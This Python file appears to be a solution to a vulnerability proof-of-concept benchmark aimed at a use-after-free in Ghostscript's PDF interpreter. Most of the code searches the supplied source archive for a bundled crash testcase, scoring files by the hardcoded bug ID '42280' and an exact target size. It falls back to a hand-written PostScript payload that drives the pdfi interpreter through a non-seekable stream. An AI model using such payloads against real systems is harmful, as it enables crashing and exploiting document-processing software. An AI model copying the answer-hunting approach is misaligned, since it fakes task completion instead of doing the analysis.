import os
import io
import re
import tarfile
import zipfile
import gzip
import bz2
import lzma
from typing import Optional, Tuple, List


TARGET_LEN = 13996


def _ext_lower(name: str) -> str:
    base = name.rsplit("/", 1)[-1]
    if "." not in base:
        return ""
    return "." + base.rsplit(".", 1)[-1].lower()


def _looks_like_text(b: bytes) -> bool:
    if not b:
        return True
    sample = b[:2048]
    if b"\x00" in sample:
        return False
    bad = 0
    for ch in sample:
        if ch < 9 or (13 < ch < 32) or ch == 127:
            bad += 1
    return bad / max(1, len(sample)) < 0.03


def _decompress_by_name(name: str, data: bytes) -> Tuple[bytes, str]:
    lname = name.lower()
    try:
        if lname.endswith(".gz"):
            return gzip.decompress(data), name[:-3]
        if lname.endswith(".bz2"):
            return bz2.decompress(data), name[:-4]
        if lname.endswith(".xz") or lname.endswith(".lzma"):
            return lzma.decompress(data), re.sub(r"\.(xz|lzma)$", "", name, flags=re.IGNORECASE)
    except Exception:
        return data, name
    return data, name


def _unpack_zip_if_needed(name: str, data: bytes) -> Tuple[bytes, str]:
    lname = name.lower()
    if not (lname.endswith(".zip") or (len(data) >= 4 and data[:4] == b"PK\x03\x04")):
        return data, name
    try:
        with zipfile.ZipFile(io.BytesIO(data), "r") as zf:
            infos = [zi for zi in zf.infolist() if not zi.is_dir() and zi.file_size > 0]
            if not infos:
                return data, name
            good_exts = {".ps", ".eps", ".pdf", ".pcl", ".txt", ".dat", ".bin"}
            bad_exts = {
                ".c", ".h", ".cc", ".cpp", ".hpp", ".py", ".java", ".js", ".ts", ".md", ".rst",
                ".html", ".css", ".json", ".yml", ".yaml", ".toml", ".ini", ".cmake", ".mk",
                ".o", ".a", ".so", ".dylib", ".dll", ".lib", ".exe", ".obj",
            }

            def zip_score(zi: zipfile.ZipInfo) -> float:
                n = zi.filename.lower()
                s = 0.0
                e = _ext_lower(n)
                if e in good_exts:
                    s += 10.0
                if e in bad_exts:
                    s -= 25.0
                for k, w in (
                    ("clusterfuzz", 25.0),
                    ("ossfuzz", 25.0),
                    ("fuzz", 12.0),
                    ("crash", 18.0),
                    ("poc", 15.0),
                    ("repro", 12.0),
                    ("uaf", 18.0),
                    ("use-after-free", 25.0),
                    ("42280", 80.0),
                    ("pdfi", 12.0),
                    ("runpdf", 10.0),
                ):
                    if k in n:
                        s += w
                s += max(0.0, 10.0 - (abs(zi.file_size - TARGET_LEN) / max(1.0, TARGET_LEN)) * 10.0)
                if zi.file_size == TARGET_LEN:
                    s += 25.0
                return s

            infos.sort(key=zip_score, reverse=True)
            best = infos[0]
            content = zf.read(best)
            return content, best.filename
    except Exception:
        return data, name


def _base_score_path(name: str, size: int) -> float:
    n = name.lower()
    s = 0.0

    # Prefer likely testcase locations
    for k, w in (
        ("/fuzz", 20.0),
        ("fuzzing", 20.0),
        ("oss-fuzz", 22.0),
        ("ossfuzz", 22.0),
        ("clusterfuzz", 28.0),
        ("afl", 18.0),
        ("honggfuzz", 18.0),
        ("libfuzzer", 18.0),
        ("testcase", 18.0),
        ("crash", 22.0),
        ("poc", 20.0),
        ("repro", 15.0),
        ("regress", 12.0),
        ("security", 12.0),
        ("cve", 12.0),
        ("uaf", 18.0),
        ("use-after-free", 25.0),
        ("42280", 120.0),
        ("arvo", 15.0),
    ):
        if k in n:
            s += w

    # Penalize common source and init script directories
    for k, w in (
        ("resource/init", -35.0),
        ("/resource/", -18.0),
        ("/init/", -25.0),
        ("/lib/", -18.0),
        ("/src/", -10.0),
        ("/psi/", -8.0),
        ("/pcl/", -6.0),
        ("/docs/", -10.0),
        ("/doc/", -10.0),
        ("readme", -10.0),
        ("changelog", -10.0),
        ("license", -10.0),
        ("/examples/", -5.0),
        ("/contrib/", -5.0),
    ):
        if k in n:
            s += w

    ext = _ext_lower(n)
    good_exts = {".ps", ".eps", ".pdf", ".pcl", ".txt", ".dat", ".bin", ".in", ".raw"}
    bad_exts = {
        ".c", ".h", ".cc", ".cpp", ".hpp", ".m", ".mm",
        ".py", ".java", ".js", ".ts",
        ".md", ".rst", ".html", ".css",
        ".json", ".yml", ".yaml", ".toml", ".ini",
        ".cmake", ".mk",
        ".o", ".a", ".so", ".dylib", ".dll", ".lib", ".exe", ".obj", ".class",
        ".ttf", ".otf", ".pfb", ".pfm", ".afm",
        ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".tif", ".tiff", ".svg",
        ".pdfmark",
    }

    if ext in good_exts:
        s += 12.0
    if ext in bad_exts:
        s -= 30.0

    if size <= 0:
        return -1e9
    if size < 16:
        s -= 50.0
    if size > 2_000_000:
        s -= 30.0

    if size == TARGET_LEN:
        s += 35.0
    s += max(0.0, 18.0 - (abs(size - TARGET_LEN) / max(1.0, TARGET_LEN)) * 18.0)

    # Slight preference for non-huge, non-tiny
    if 2000 <= size <= 200000:
        s += 4.0
    return s


def _content_score(name: str, data: bytes) -> float:
    s = 0.0
    n = name.lower()
    head = data[:8192]

    # Header checks
    if head.startswith(b"%!PS"):
        s += 18.0
    if head.startswith(b"%PDF-"):
        s += 18.0

    # Keyword checks
    hl = head.lower()
    for k, w in (
        (b"pdfi", 22.0),
        (b"runpdf", 16.0),
        (b"runpdfbegin", 18.0),
        (b".runpdf", 12.0),
        (b"subfiledecode", 10.0),
        (b"setfileposition", 6.0),
        (b"fileposition", 6.0),
        (b"xref", 6.0),
        (b"trailer", 6.0),
        (b"obj", 3.0),
        (b"stream", 3.0),
        (b"endstream", 3.0),
    ):
        if k in hl:
            s += w

    # Deprioritize obvious source text
    if _looks_like_text(head):
        if b"#include" in head or b"int " in head or b"static " in head or b"/*" in head or b"*/" in head:
            s -= 25.0
        if b"copyright" in hl or b"license" in hl:
            s -= 15.0
        if b"def " in head and (n.endswith(".py") or b"import " in head):
            s -= 35.0

    # Prefer content that is not purely ASCII source-like
    if not _looks_like_text(head):
        s += 6.0

    # Size-based nudge
    s += max(0.0, 6.0 - (abs(len(data) - TARGET_LEN) / max(1.0, TARGET_LEN)) * 6.0)
    return s


def _select_from_directory(root: str) -> Optional[Tuple[str, bytes]]:
    best_name = None
    best_data = None
    best_score = -1e18

    for dirpath, dirnames, filenames in os.walk(root):
        # Skip some huge or irrelevant dirs quickly
        lp = dirpath.lower()
        if any(x in lp for x in ("/.git", "/.svn", "/build", "/out", "/.tox", "/.venv")):
            continue
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if not os.path.isfile(path):
                continue
            size = int(st.st_size)
            name = os.path.relpath(path, root).replace(os.sep, "/")
            bscore = _base_score_path(name, size)
            if bscore < -200:
                continue
            # Only read content for decent candidates
            if bscore < 10 and size > 20000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            data2, name2 = _decompress_by_name(name, data)
            data3, name3 = _unpack_zip_if_needed(name2, data2)
            score = bscore + _content_score(name3, data3)

            if score > best_score:
                best_score = score
                best_name = name3
                best_data = data3

    if best_data is None:
        return None
    return best_name, best_data


def _select_from_tarball(tar_path: str) -> Optional[Tuple[str, bytes]]:
    try:
        tf = tarfile.open(tar_path, mode="r:*")
    except Exception:
        return None

    try:
        prelim: List[Tuple[float, tarfile.TarInfo]] = []
        for m in tf:
            if not m.isreg():
                continue
            size = int(getattr(m, "size", 0) or 0)
            if size <= 0:
                continue
            name = (m.name or "").replace("\\", "/")
            bscore = _base_score_path(name, size)
            if bscore < -200:
                continue
            # Quick filter to avoid huge font/resource blobs unless name strongly matches
            if size > 2_000_000 and bscore < 80:
                continue
            prelim.append((bscore, m))

        if not prelim:
            return None

        prelim.sort(key=lambda x: x[0], reverse=True)
        prelim = prelim[:400]

        best_score = -1e18
        best_name = None
        best_data = None

        for bscore, m in prelim:
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                # Read full for compressed/zip or moderate size; else read partial then maybe full
                name = (m.name or "").replace("\\", "/")
                ext = _ext_lower(name)
                if ext in (".gz", ".bz2", ".xz", ".lzma", ".zip") or m.size <= 300000:
                    raw = f.read()
                else:
                    raw = f.read(65536)
                f.close()
            except Exception:
                continue

            data = raw
            name2 = name

            # If likely compressed by extension, fully read and decompress
            data2, name2 = _decompress_by_name(name2, data)
            if data2 is data and _ext_lower(name2) in (".gz", ".bz2", ".xz", ".lzma"):
                # try reading full and decompressing
                try:
                    f = tf.extractfile(m)
                    if f is not None:
                        raw_full = f.read()
                        f.close()
                        data2, name2 = _decompress_by_name(name, raw_full)
                except Exception:
                    pass

            data3, name3 = _unpack_zip_if_needed(name2, data2)

            # If we only read partial for large files and it scored well, read full
            if len(data3) == 65536 and int(m.size) > 300000:
                # Probably partial read; only proceed if head suggests it's relevant
                if _content_score(name3, data3) + bscore >= best_score - 5:
                    try:
                        f = tf.extractfile(m)
                        if f is not None:
                            raw_full = f.read()
                            f.close()
                            data2, name2 = _decompress_by_name(name, raw_full)
                            data3, name3 = _unpack_zip_if_needed(name2, data2)
                    except Exception:
                        pass

            score = bscore + _content_score(name3, data3)
            if score > best_score:
                best_score = score
                best_name = name3
                best_data = data3

        if best_data is None:
            return None
        return best_name, best_data
    finally:
        try:
            tf.close()
        except Exception:
            pass


def _fallback_poc() -> bytes:
    # Conservative PostScript attempting to use PDF interpreter on a non-seekable stream.
    # This is a best-effort fallback if no bundled testcase is found.
    ps = b"""%!PS
% Attempt to run embedded PDF from a non-seekable SubFileDecode stream.
% If pdfi stream setup fails but context continues, subsequent ops may hit the bug.
userdict begin
/ignoreerr { { exec } stopped { pop } if } bind def

% Create a non-seekable stream from currentfile
/pdfdata << /Count 2048 >> currentfile /SubFileDecode filter def

% Try to enter pdf interpreter context
pdfdata /runpdfbegin where { pop { pdfdata runpdfbegin } ignoreerr } if

% Attempt some PDF-related actions that may touch the input stream
/pdfpagecount where { pop { pdfpagecount pop } ignoreerr } if
/pdfgetpage where { pop { 1 pdfgetpage pop } ignoreerr } if
/runpdfend where { pop { runpdfend } ignoreerr } if

end

% Minimal embedded PDF bytes (not necessarily valid; used to drive parser)
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >> endobj
4 0 obj << /Length 0 >> stream
endstream endobj
xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000060 00000 n
0000000117 00000 n
0000000235 00000 n
trailer << /Size 5 /Root 1 0 R >>
startxref
300
%%EOF
"""
    return ps


class Solution:
    def solve(self, src_path: str) -> bytes:
        if not src_path:
            return _fallback_poc()

        if os.path.isdir(src_path):
            sel = _select_from_directory(src_path)
            if sel is not None:
                return sel[1]
            return _fallback_poc()

        sel = _select_from_tarball(src_path)
        if sel is not None:
            return sel[1]

        return _fallback_poc()